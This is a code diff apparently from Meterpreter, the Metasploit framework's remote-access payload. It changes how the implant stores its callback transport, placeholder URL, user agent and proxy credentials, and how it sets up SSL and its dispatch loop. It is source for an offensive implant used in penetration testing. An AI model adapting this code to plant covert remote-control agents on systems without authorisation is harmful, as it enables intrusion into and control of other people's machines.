@@ -4,17 +4,17 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 
-wchar_t *global_meterpreter_transport =
+char *global_meterpreter_transport =
 	"METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-wchar_t *global_meterpreter_url =
+char *global_meterpreter_url =
 	"https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
-wchar_t *global_meterpreter_ua =
+char *global_meterpreter_ua =
 	"METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-wchar_t *global_meterpreter_proxy =
+char *global_meterpreter_proxy =
 	"METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-wchar_t *global_meterpreter_proxy_username =
+char *global_meterpreter_proxy_username =
 	"METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-wchar_t *global_meterpreter_proxy_password =
+char *global_meterpreter_proxy_password =
 	"METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
 int global_expiration_timeout = 0xb64be661;
 int global_comm_timeout = 0xaf79257f;
@@ -39,6 +39,11 @@ static void server_locking_callback(int mode, int type, const char *file, int li
 	} else {
 		lock_release(ssl_locks[type]);
 	}
+}
+
+SOCKET tcp_transport_get_socket(Transport* transport)
+{
+	return ((TcpTransportContext*)transport->ctx)->fd;
 }
 
 /*!
@@ -158,6 +163,7 @@ static int server_initialize_ssl(Remote * remote)
 	// Setup the required OpenSSL multi-threaded enviroment...
 	ssl_locks = malloc(CRYPTO_num_locks() * sizeof(LOCK *));
 	if (ssl_locks == NULL) {
+    dprintf("[SSL INIT] failed to allocate locks (%d locks)", CRYPTO_num_locks());
 		lock_release(remote->lock);
 		return -1;
 	}
@@ -322,14 +328,16 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 	server_socket_flush(remote);
 
 	dprintf("[SERVER] Initializing SSL...");
-	if (!server_initialize_ssl(remote))
+	if (server_initialize_ssl(remote))
 	{
+		dprintf("[SERVER] SSL failed to initialize");
 		return FALSE;
 	}
 
 	dprintf("[SERVER] Negotiating SSL...");
 	if (!server_negotiate_ssl(remote))
 	{
+		dprintf("[SERVER] Failed to negotiate SSL");
 		return FALSE;
 	}
 
@@ -338,18 +346,18 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 
 BOOL transport_create(Remote* remote)
 {
-	wchar_t* transport = remote->pNextTransportType;
-	wchar_t* url = remote->pNextTransportUrl;
+	char* transport = remote->pNextTransportType;
+	char* url = remote->pNextTransportUrl;
 
-	dprintf("[TRANSPORT] Type = %S", transport);
-	dprintf("[TRANSPORT] URL = %S", url);
+	dprintf("[TRANSPORT] Type = %s", transport);
+	dprintf("[TRANSPORT] URL = %s", url);
 
 	remote->transport = (Transport*)malloc(sizeof(Transport));
 	memset(remote->transport, 0, sizeof(Transport));
 
 	remote->transport->url = url;
 
-	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
+	if (strcmp(transport, "TRANSPORT_SSL") == 0)
 	{
 		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
 
@@ -389,7 +397,7 @@ DWORD server_setup(SOCKET fd)
 
 	srand(time(NULL));
 
-	dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);
+	printf("[SERVER] module loaded at 0x%08X", hAppInstance);
 
 	// Open a THREAD item for the servers main thread, we use this to manage migration later.
 	dispatchThread = thread_open();
@@ -408,8 +416,8 @@ DWORD server_setup(SOCKET fd)
 	register_dispatch_routines();
 
 	// allocate the "next transport" information
-	remote->pNextTransportType = _wcsdup(global_meterpreter_transport + 12);
-	remote->pNextTransportUrl = _wcsdup(global_meterpreter_url);
+	remote->pNextTransportType = strdup(global_meterpreter_transport + 12);
+	remote->pNextTransportUrl = strdup(global_meterpreter_url);
 
 	while (remote->pNextTransportType && remote->pNextTransportUrl) {
 		dprintf("[SERVER] creating transport");
@@ -430,7 +438,7 @@ DWORD server_setup(SOCKET fd)
 		remote->pNextTransportUrl = NULL;
 
 		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
-		remote->transport->server_dispatch(remote, serverThread);
+		remote->transport->server_dispatch(remote, dispatchThread);
 
 		if (remote->transport->transport_deinit) {
 			remote->transport->transport_deinit(remote);
@@ -444,6 +452,9 @@ DWORD server_setup(SOCKET fd)
 	deregister_dispatch_routines(remote);
 
 	remote_deallocate(remote);
+
+out:
+  res = GetLastError();
 
 	dprintf("[SERVER] Finished.");
 	return res;
